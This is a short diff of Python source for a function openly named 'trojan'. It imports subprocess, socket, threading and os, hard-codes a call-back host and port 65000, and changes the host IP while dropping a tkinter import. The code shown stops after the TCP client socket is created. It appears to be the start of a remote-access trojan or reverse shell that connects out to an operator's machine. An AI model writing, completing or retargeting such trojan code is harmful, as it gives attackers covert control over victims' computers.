@@ -1,11 +1,10 @@
 import subprocess
-import tkinter as tk
 import socket
 import threading
 import os
 
 def trojan():
-    HOST = '172.29.41.16'
+    HOST = '172.29.45.176'
     PORT = 65000
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
